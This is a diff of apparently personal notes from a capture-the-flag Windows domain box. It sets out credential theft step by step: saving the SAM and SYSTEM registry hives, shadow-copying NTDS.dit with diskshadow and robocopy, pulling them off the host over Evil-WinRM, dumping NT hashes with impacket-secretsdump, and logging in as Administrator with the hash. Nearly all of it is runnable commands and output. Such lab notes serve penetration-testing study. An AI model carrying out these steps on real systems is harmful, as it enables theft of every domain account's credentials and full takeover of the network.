@@ -1,13 +1,13 @@
 we can use these hives to dump user NTLM hashes. We can then use the Administrator hash to authenticate instead of a plaintext password.
 
 ```
-reg save hklm\sam sam
+reg save HKLM\SAM C:\Users\Public\sam
 ```
 
 The operation completed successfully.
 
 ```
-reg save hklm\system system
+reg save HKLM\SYSTEM C:\Users\Public\system
 ```
 
 The operation completed successfully
@@ -15,11 +15,11 @@ The operation completed successfully
 Evil win rm only : 
 
 ```
-download sam
+download C:\\Users\\Public\\sam
 ```
 
 ```
-download system
+download C:\\Users\\Public\\system
 ```
 
 ---
@@ -50,4 +50,72 @@ Warning: Remote path completions is disabled due to ruby limitation: quoting_det
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
 
 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+---
+
+# Method 2 
+
+ This means the `emily` account is able to make a copy of the `NTDS.dit` file and the `HKLM\SYSTEM` hive. Those two files will allow us to dump the NT hash for all accounts.
+
+```
+gedit bkup.txt  
+```
+
+```powershell
+set verbose on  
+set metadata C:\Windows\Temp\meta.cab  
+set context clientaccessible  
+set context persistent  
+begin backup  
+add volume C: alias cdrive  
+create  
+expose %cdrive% E:  
+end backup
+```
+
+---
+
+```
+upload bkup.txt
+```
+
+making a backup  
+```
+diskshadow /s bkup.txt
+```
+
+![[Pasted image 20260911023559.png]]
+
+![[Pasted image 20260911023659.png]]
+
+making a copy of NTDS.dit  
+```
+robocopy /b E:\Windows\ntds . ntds.dit
+```
+
+![[Pasted image 20260911023733.png]]
+
+```
+reg save HKLM\SYSTEM C:\Users\Public\system
+```
+
+```
+download C:\\Users\\Public\\system
+```
+
+```
+download ntds.dit
+```
+
+---
+
+Impacket to dump hash
+```
+impacket-secretsdump -ntds ndts.dit -system system local
+```
+
+Enter with hash
+```
+evil-winrm -u Administrator -H [hash] -i [domain.htb]
 ```
